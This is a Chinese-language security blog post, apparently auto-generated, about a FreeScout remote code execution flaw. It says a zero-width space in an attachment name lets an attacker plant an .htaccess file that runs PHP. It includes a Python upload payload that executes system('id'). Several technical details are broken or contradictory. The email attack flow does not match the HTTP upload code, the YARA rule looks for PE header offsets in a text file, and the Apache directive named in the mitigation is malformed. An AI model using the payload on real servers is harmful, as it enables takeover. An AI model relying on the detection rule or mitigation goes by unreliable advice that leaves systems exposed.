---
layout: post
title:  "Mail2Shell zero-click attack lets hackers hijack FreeScout mail servers"
date:   2026-03-05 01:25:44 +0000
categories: [security]
severity: critical
---

# 🚨 解析 FreeScout 遠程代碼執行漏洞：CVE-2026-28289
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Zero-Width Space (ZWS), File Upload Bypass, Deserialization

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: FreeScout 的檔案上傳機制中，沒有正確地檢查檔案名稱的邊界，導致攻擊者可以使用 Zero-Width Space (ZWS) 字元來繞過檔案名稱的限制。
* **攻擊流程圖解**:
  1. 攻擊者發送一封帶有惡意附件的電子郵件到 FreeScout 的郵箱。
  2. FreeScout 儲存附件到 `/storage/attachment/` 目錄中。
  3. 攻擊者使用 ZWS 字元來繞過檔案名稱的限制，將惡意檔案上傳到伺服器。
  4. 伺服器處理檔案時，會移除 ZWS 字元，導致檔案被儲存為 dotfile。
  5. 攻擊者可以通過 Web 介面存取上傳的 payload，並在伺服器上執行命令。
* **受影響元件**: FreeScout 1.8.206 及之前版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 FreeScout 的郵箱地址和檔案上傳機制。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意檔案名稱
    filename = "example" + "\u200b" + ".htaccess"
    
    # 定義惡意檔案內容
    payload = b"AddType application/x-httpd-php .jpg\n<?php system('id'); ?>"
    
    # 發送帶有惡意附件的電子郵件
    requests.post("https://example.com/freescout/upload", files={"file": (filename, payload)})
    
    ```
* **繞過技術**: 攻擊者可以使用 ZWS 字元來繞過檔案名稱的限制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /storage/attachment/example.htaccess |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule FreeScout_RCE {
      meta:
        description = "Detects FreeScout RCE vulnerability"
      strings:
        $a = ".htaccess" wide
      condition:
        $a at pe.header_offset + pe.file_alignment
    }
    
    ```
* **緩解措施**: 更新 FreeScout 到 1.8.207 版本或以上，並設定 Apache 的 `AllowOverrideAll` 參數為 `None`。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Zero-Width Space (ZWS)**: 一種 Unicode 字元，用于繞過檔案名稱的限制。
* **Deserialization**: 將資料從字串或其他格式轉換回物件的過程。
* **Remote Code Execution (RCE)**: 遠程代碼執行，允許攻擊者在伺服器上執行任意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/mail2shell-zero-click-attack-lets-hackers-hijack-freescout-mail-servers/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


